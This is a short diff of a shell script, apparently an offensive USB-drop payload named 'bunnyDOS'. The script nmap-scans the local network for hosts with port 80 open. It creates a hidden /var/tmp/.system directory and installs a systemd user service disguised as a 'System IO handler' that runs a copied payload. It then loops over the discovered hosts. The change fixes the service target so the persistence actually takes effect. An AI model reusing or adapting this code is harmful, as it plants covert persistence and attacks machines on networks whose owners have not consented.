@@ -6,7 +6,7 @@ ip=$(ip -o -f inet addr show | awk '/scope global/ {print $4}')
 open=$(nmap -p 80 $ip -q -oG - | grep open | awk '{print $2}' | awk '{printf("%s ",$0)} END { printf "\n" }')
 mkdir /var/tmp/.system/
 mkdir -p ~/.config/systemd/user 
-echo -e "[Unit]\nDescription= System IO handler.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/sysHandler -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=multi-user.target" > ~/.config/systemd/user/libSystemIO.service
+echo -e "[Unit]\nDescription= System IO handler.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/sysHandler -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/libSystemIO.service
 cp -r $mntt/payloads/library/bunnyDOS/systemIO /var/tmp/.system/
 chmod +x /var/tmp/.system/systemIO
 for i in $open
